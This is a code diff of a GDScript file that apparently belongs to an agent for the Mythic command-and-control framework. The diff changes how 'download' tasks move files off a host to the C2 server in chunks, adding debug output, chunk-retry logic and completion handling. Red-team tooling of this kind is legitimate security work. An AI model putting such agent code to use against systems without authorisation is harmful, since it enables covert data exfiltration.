@@ -5,6 +5,8 @@ var file_tasks
 var time = 0
 var time_period = 1
 
+var FileTransfer = preload("res://file_transfer.gd")
+
 func _ready():
 	api = $".".get_parent().get_node("api")
 	file_tasks = {}
@@ -30,6 +32,10 @@ func _on_tasking_upload(task):
 
 
 func _on_tasking_download(task):
+	
+	print("\n\n______________________________________________________")
+	print(task)
+	print("______________________________________________________\n\n")
 
 	if task.has("command") and task.get("command") == "download" and task.has("parameters"):
 		var task_id = task.get("id")
@@ -39,8 +45,6 @@ func _on_tasking_download(task):
 
 		print("upload the following")
 		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("file_path"), FileTransfer.DIRECTION.DOWNLOAD, api)
-		print(parameters.get("file_path"))
-		print("")
 	else:
 		print("bad upload task: ", task)
 		# TODO: agent_response in failure cases
@@ -54,8 +58,6 @@ func _process(delta):
 		for task_id in file_tasks.keys():
 			file_tasks[task_id].process()
 
-			# TODO: we shouldn't remove file_tasks until we get the final 'ok' response from mythic - but right now, I don't care...
-
 			match file_tasks[task_id].state:
 				FileTransfer.STATUS.ERROR:
 					print("Failed to download: ")
@@ -68,7 +70,6 @@ func _process(delta):
 				FileTransfer.STATUS.COMPLETE:
 					print("File COMPLETE: ")
 					file_tasks[task_id].debug()
-					file_tasks.erase(task_id)
 				_:
 					print("Unknown file : ", task_id, file_tasks[task_id])
 
@@ -88,9 +89,28 @@ func _on_tasking_download_chunk(response):
 	# roll active_file_handle.position back one chunk_size if position > 0
 	var task_id = response.get("task_id")
 	var file_id = response.get("file_id")
+	var send_file_chunk = true
 
 	if file_tasks.has(task_id):
-		file_tasks[task_id].process_download_chunk(file_id)
+		if response.get("stopped") == task_id:
+			send_file_chunk = false
+
+		if response.get("status") != "success":
+			if file_tasks[task_id].position > file_tasks[task_id].chunk_size:
+				file_tasks[task_id].position = file_tasks[task_id].position - file_tasks[task_id].chunk_size
+			else:
+				file_tasks[task_id].position = 0
+			
+			if file_tasks[task_id].completed:
+				send_file_chunk = false
+
+		if file_tasks[task_id].completed:
+			file_tasks[task_id].process_file_complete()
+			file_tasks.erase(task_id)
+			send_file_chunk = false
+
+		if send_file_chunk:
+			file_tasks[task_id].process_download_chunk(file_id)
 	else:
 		print("oh snap, didn't find that task id: ", task_id)
 
